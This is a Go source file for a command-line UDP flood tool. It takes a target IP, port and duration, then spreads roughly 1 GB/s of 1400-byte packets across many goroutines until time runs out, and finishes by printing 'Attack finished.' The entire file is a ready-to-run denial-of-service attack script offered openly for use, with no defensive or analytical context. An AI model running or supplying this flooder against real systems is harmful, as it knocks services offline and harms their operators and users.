package main

import (
 "fmt"
 "net"
 "os"
 "strconv"
 "sync"
 "time"
)

func main() {
 if len(os.Args) != 4 {
  fmt.Println("Usage: go run udp.go <target_ip> <target_port> <attack_duration>")
  return
 }

 targetIP := os.Args[1]
 targetPort := os.Args[2]
 duration, err := strconv.Atoi(os.Args[3])
 if err != nil {
  fmt.Println("Invalid attack duration:", err)
  return
 }

 // Calculate the number of packets needed to achieve 1GB/s traffic
 packetSize := 1400 // Adjust packet size as needed
 packetsPerSecond := 1_000_000_000 / packetSize
 numThreads := packetsPerSecond / 25_000

 // Create wait group to ensure all goroutines finish before exiting
 var wg sync.WaitGroup

 // Create a deadline time for when the attack should stop
 deadline := time.Now().Add(time.Duration(duration) * time.Second)

 // Launch goroutines for each thread
 for i := 0; i < numThreads; i++ {
  wg.Add(1)
  go func() {
   defer wg.Done()
   sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, deadline)
  }()
 }

 // Wait for all goroutines to finish
 wg.Wait()

 fmt.Println("Attack finished.")
}

func sendUDPPackets(ip, port string, packetsPerSecond int, deadline time.Time) {
 for time.Now().Before(deadline) {
  conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
  if err != nil {
   fmt.Println("Error connecting:", err)
   time.Sleep(100 * time.Millisecond) // Retry after a short delay
   continue
  }

  // Generate and send UDP packets continuously until the deadline
  packet := make([]byte, 1400) // Adjust packet size as needed
  ticker := time.NewTicker(time.Second / time.Duration(packetsPerSecond))
  defer ticker.Stop()

  for time.Now().Before(deadline) {
   select {
   case <-ticker.C:
    _, err := conn.Write(packet)
    if err != nil {
     fmt.Println("Error sending UDP packet:", err)
     conn.Close()
     time.Sleep(100 * time.Millisecond) // Retry after a short delay
     break
    }
   }
  }
  conn.Close()
 }
}